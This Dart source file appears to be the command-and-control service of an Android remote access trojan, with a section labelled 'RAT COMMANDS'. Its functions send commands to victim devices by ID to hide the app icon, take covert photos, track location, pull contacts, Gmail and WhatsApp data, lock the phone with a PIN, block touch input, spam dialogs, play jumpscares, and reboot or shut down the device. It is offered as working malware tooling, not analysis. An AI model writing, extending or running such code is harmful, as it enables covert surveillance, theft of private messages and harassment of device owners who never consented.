// lib/services/command_service.dart
import '../models/command_model.dart';
import 'api_service.dart';

class CommandService {
  static final CommandService _instance = CommandService._internal();
  factory CommandService() => _instance;
  CommandService._internal();

  final ApiService _api = ApiService();

  // ============================================================
  //  SEND COMMAND
  // ============================================================
  Future<Map<String, dynamic>> sendCommand(
    String deviceId,
    String command, {
    String? extra,
  }) async {
    return _api.sendCommand(deviceId, command, extra: extra);
  }

  // ============================================================
  //  GET COMMAND HISTORY
  // ============================================================
  Future<List<CommandModel>> getCommandHistory(String deviceId) async {
    try {
      final result = await _api.getCommandHistory(deviceId);
      if (result['success'] == true) {
        final list = result['history'] ?? [];
        return list.map((c) => CommandModel.fromJson(c)).toList();
      }
      return [];
    } catch (e) {
      return [];
    }
  }

  // ============================================================
  //  GET COMMAND RESULT
  // ============================================================
  Future<Map<String, dynamic>?> getCommandResult(String commandId) async {
    try {
      final result = await _api.getCommandResult(commandId);
      if (result['success'] == true) {
        return result['result'];
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  // ============================================================
  //  RAT COMMANDS
  // ============================================================
  Future<Map<String, dynamic>> flashlight(String deviceId, bool on) async {
    return sendCommand(deviceId, 'flashlight', extra: on ? 'on' : 'off');
  }

  Future<Map<String, dynamic>> lockDevice(String deviceId, {String? pin}) async {
    return sendCommand(deviceId, 'lockDevice', extra: pin ?? '0000');
  }

  Future<Map<String, dynamic>> unlockDevice(String deviceId) async {
    return sendCommand(deviceId, 'unlockDevice');
  }

  Future<Map<String, dynamic>> hideIcon(String deviceId, bool hide) async {
    return sendCommand(deviceId, 'hideIcon', extra: hide ? 'true' : 'false');
  }

  Future<Map<String, dynamic>> takePhoto(String deviceId, String facing) async {
    return sendCommand(deviceId, 'takePhoto', extra: facing);
  }

  Future<Map<String, dynamic>> getLocation(String deviceId) async {
    return sendCommand(deviceId, 'getLocation');
  }

  Future<Map<String, dynamic>> getContacts(String deviceId) async {
    return sendCommand(deviceId, 'getContacts');
  }

  Future<Map<String, dynamic>> getGmail(String deviceId) async {
    return sendCommand(deviceId, 'getGmail');
  }

  Future<Map<String, dynamic>> getWhatsApp(String deviceId) async {
    return sendCommand(deviceId, 'getWhatsApp');
  }

  Future<Map<String, dynamic>> vibrate(String deviceId, int duration) async {
    return sendCommand(deviceId, 'vibrate', extra: duration.toString());
  }

  Future<Map<String, dynamic>> showToast(String deviceId, String message) async {
    return sendCommand(deviceId, 'showToast', extra: message);
  }

  Future<Map<String, dynamic>> openUrl(String deviceId, String url) async {
    return sendCommand(deviceId, 'openUrl', extra: url);
  }

  Future<Map<String, dynamic>> playAudio(String deviceId, String url) async {
    return sendCommand(deviceId, 'playAudio', extra: url);
  }

  Future<Map<String, dynamic>> setWallpaper(String deviceId, String url) async {
    return sendCommand(deviceId, 'setWallpaper', extra: url);
  }

  Future<Map<String, dynamic>> ttsSpeak(String deviceId, String text) async {
    return sendCommand(deviceId, 'ttsSpeak', extra: text);
  }

  Future<Map<String, dynamic>> dialogSpam(String deviceId, String text) async {
    return sendCommand(deviceId, 'dialogSpam', extra: text);
  }

  Future<Map<String, dynamic>> touchBlock(String deviceId, int duration) async {
    return sendCommand(deviceId, 'touchBlock', extra: duration.toString());
  }

  Future<Map<String, dynamic>> muteVolume(String deviceId, bool mute) async {
    return sendCommand(deviceId, 'muteVolume', extra: mute ? 'true' : 'false');
  }

  Future<Map<String, dynamic>> jumpscare(String deviceId, bool on) async {
    return sendCommand(deviceId, 'jumpscare', extra: on ? 'true' : 'false');
  }

  Future<Map<String, dynamic>> reboot(String deviceId) async {
    return sendCommand(deviceId, 'reboot');
  }

  Future<Map<String, dynamic>> shutdown(String deviceId) async {
    return sendCommand(deviceId, 'shutdown');
  }
}